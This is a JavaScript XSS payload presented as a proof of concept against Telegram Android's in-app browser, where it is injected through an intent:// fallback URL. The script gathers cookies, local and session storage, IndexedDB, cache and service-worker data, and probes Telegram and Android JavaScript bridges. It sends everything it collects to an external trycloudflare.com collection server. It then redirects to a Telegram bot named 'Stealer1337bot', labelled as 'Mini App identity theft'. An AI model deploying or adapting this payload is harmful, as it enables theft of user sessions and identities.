// XSS Proof-of-Concept payload for Telegram Android intent:// vulnerability
// Fires in Telegram's in-app browser WebView context

// 1. Classic XSS alert
alert('XSS in Telegram Android\n\nOrigin: ' + location.origin + '\nCookies: ' + (document.cookie || '(none)'));

// 2. Enumerate everything accessible
var data = {};

// Cookies
data.cookies = document.cookie || '(none)';

// localStorage
data.localStorage = {};
try {
  for (var i = 0; i < localStorage.length; i++) {
    var k = localStorage.key(i);
    data.localStorage[k] = localStorage.getItem(k);
  }
} catch(e) { data.localStorage = '(blocked)'; }

// sessionStorage
data.sessionStorage = {};
try {
  for (var i = 0; i < sessionStorage.length; i++) {
    var k = sessionStorage.key(i);
    data.sessionStorage[k] = sessionStorage.getItem(k);
  }
} catch(e) { data.sessionStorage = '(blocked)'; }

// Check for Telegram JavaScript bridges/interfaces
data.bridges = {};
var bridgeNames = [
  'TelegramWebviewProxy', 'TelegramGameProxy', 'TelegramWebview',
  '__tg__', '_tg_', 'Telegram', 'TelegramWebviewProxyProto'
];
bridgeNames.forEach(function(name) {
  if (window[name]) {
    data.bridges[name] = typeof window[name];
    // Try to enumerate methods
    try {
      var methods = [];
      for (var prop in window[name]) {
        methods.push(prop + ': ' + typeof window[name][prop]);
      }
      if (methods.length) data.bridges[name + '_methods'] = methods;
    } catch(e) {}
  }
});

// Check for Android WebView JavascriptInterface objects
try {
  if (window.Android) data.bridges['Android'] = typeof window.Android;
  if (window.app) data.bridges['app'] = typeof window.app;
  if (window.native) data.bridges['native'] = typeof window.native;
} catch(e) {}

// IndexedDB databases
data.indexedDB = [];
try {
  if (indexedDB.databases) {
    indexedDB.databases().then(function(dbs) {
      data.indexedDB = dbs.map(function(db) { return db.name + ' v' + db.version; });
    }).catch(function(){});
  }
} catch(e) {}

// Service workers
data.serviceWorkers = [];
try {
  if (navigator.serviceWorker) {
    navigator.serviceWorker.getRegistrations().then(function(regs) {
      data.serviceWorkers = regs.map(function(r) { return r.scope; });
    }).catch(function(){});
  }
} catch(e) {}

// Cache API
data.caches = [];
try {
  if (window.caches) {
    caches.keys().then(function(names) { data.caches = names; }).catch(function(){});
  }
} catch(e) {}

// Context info
data.origin = window.origin;
data.domain = document.domain;
data.url = location.href;
data.protocol = location.protocol;
data.referrer = document.referrer;
data.ua = navigator.userAgent;

// 3. Build XSS proof display
setTimeout(function() {
  var lsCount = typeof data.localStorage === 'object' ? Object.keys(data.localStorage).length : 0;
  var ssCount = typeof data.sessionStorage === 'object' ? Object.keys(data.sessionStorage).length : 0;
  var bridgeCount = Object.keys(data.bridges).length;

  var lsHtml = '';
  if (typeof data.localStorage === 'object' && lsCount > 0) {
    for (var k in data.localStorage) {
      lsHtml += '<div class="kv"><span class="k">' + esc(k) + '</span><span class="v">' + esc((data.localStorage[k] || '').substring(0, 200)) + '</span></div>';
    }
  } else {
    lsHtml = '<div class="empty">' + (lsCount === 0 ? '(empty)' : data.localStorage) + '</div>';
  }

  var ssHtml = '';
  if (typeof data.sessionStorage === 'object' && ssCount > 0) {
    for (var k in data.sessionStorage) {
      ssHtml += '<div class="kv"><span class="k">' + esc(k) + '</span><span class="v">' + esc((data.sessionStorage[k] || '').substring(0, 200)) + '</span></div>';
    }
  } else {
    ssHtml = '<div class="empty">(empty)</div>';
  }

  var bridgeHtml = '';
  if (bridgeCount > 0) {
    for (var k in data.bridges) {
      var val = data.bridges[k];
      if (Array.isArray(val)) val = val.join(', ');
      bridgeHtml += '<div class="kv"><span class="k">' + esc(k) + '</span><span class="v bridge-found">' + esc(String(val)) + '</span></div>';
    }
  } else {
    bridgeHtml = '<div class="empty">(none detected)</div>';
  }

  document.documentElement.innerHTML = '<head><meta name="viewport" content="width=device-width,initial-scale=1.0"><style>'
    + '* { margin:0; padding:0; box-sizing:border-box; }'
    + 'body { background:#0a0a0a; color:#00ff41; font-family:"Courier New",monospace; font-size:13px; padding:16px; }'
    + '.banner { text-align:center; padding:20px 0 16px; }'
    + '.banner h1 { color:#ff0040; font-size:24px; text-shadow:0 0 20px rgba(255,0,64,0.5); letter-spacing:2px; }'
    + '.banner .sub { color:#ff6b6b; font-size:12px; margin-top:4px; }'
    + '.section { margin:12px 0; }'
    + '.section-title { color:#00b8ff; font-size:14px; font-weight:bold; border-bottom:1px solid #1a3a4a; padding-bottom:4px; margin-bottom:6px; }'
    + '.kv { display:flex; gap:8px; padding:2px 0; word-break:break-all; }'
    + '.k { color:#888; min-width:100px; flex-shrink:0; }'
    + '.v { color:#00ff41; }'
    + '.v.cookie-val { color:#ffaa00; }'
    + '.v.bridge-found { color:#ff0; }'
    + '.empty { color:#555; font-style:italic; }'
    + '.countdown { text-align:center; color:#ff0040; margin-top:16px; font-size:11px; }'
    + '.idx { color:#555; margin-top:8px; font-size:11px; }'
    + '</style></head><body>'
    + '<div class="banner">'
    + '<h1>XSS CONFIRMED</h1>'
    + '<div class="sub">Telegram Android In-App Browser</div>'
    + '<div class="sub" style="color:#888;">intent:// URI browser_fallback_url injection</div>'
    + '</div>'

    + '<div class="section"><div class="section-title">CONTEXT</div>'
    + '<div class="kv"><span class="k">Origin:</span><span class="v">' + esc(data.origin) + '</span></div>'
    + '<div class="kv"><span class="k">Domain:</span><span class="v">' + esc(data.domain) + '</span></div>'
    + '<div class="kv"><span class="k">Protocol:</span><span class="v">' + esc(data.protocol) + '</span></div>'
    + '<div class="kv"><span class="k">URL:</span><span class="v">' + esc(data.url.substring(0, 80)) + '</span></div>'
    + '</div>'

    + '<div class="section"><div class="section-title">COOKIES</div>'
    + '<div class="kv"><span class="k">document.cookie</span><span class="v cookie-val">' + esc(data.cookies) + '</span></div>'
    + '</div>'

    + '<div class="section"><div class="section-title">LOCAL STORAGE (' + lsCount + ' keys)</div>' + lsHtml + '</div>'
    + '<div class="section"><div class="section-title">SESSION STORAGE (' + ssCount + ' keys)</div>' + ssHtml + '</div>'

    + '<div class="section"><div class="section-title">TELEGRAM JS BRIDGES</div>' + bridgeHtml + '</div>'

    + '<div class="section"><div class="section-title">USER AGENT</div>'
    + '<div class="v" style="font-size:11px;word-break:break-all;">' + esc(data.ua) + '</div>'
    + '</div>'

    + (data.indexedDB.length ? '<div class="idx">IndexedDB: ' + esc(data.indexedDB.join(', ')) + '</div>' : '')
    + (data.caches.length ? '<div class="idx">Caches: ' + esc(data.caches.join(', ')) + '</div>' : '')
    + (data.serviceWorkers.length ? '<div class="idx">SW: ' + esc(data.serviceWorkers.join(', ')) + '</div>' : '')

    + '<div class="countdown" id="cd">Chaining to Mini App identity theft in 4s...</div>'
    + '</body>';

  // Countdown then chain to Mini App
  var sec = 4;
  var cdEl = document.getElementById('cd');
  var ti = setInterval(function() {
    sec--;
    if (cdEl) cdEl.textContent = 'Chaining to Mini App identity theft in ' + sec + 's...';
    if (sec <= 0) {
      clearInterval(ti);
      location.href = 'tg://resolve?domain=Stealer1337bot&start=auto&startapp=x';
    }
  }, 1000);

  // Send data to collection server
  try {
    navigator.sendBeacon('https://brings-popularity-elsewhere-libraries.trycloudflare.com/collect/xss', JSON.stringify({
      type: 'xss',
      data: data,
      ts: Date.now()
    }));
  } catch(e) {}

}, 200);

function esc(s) {
  var d = document.createElement('div');
  d.textContent = s || '';
  return d.innerHTML;
}
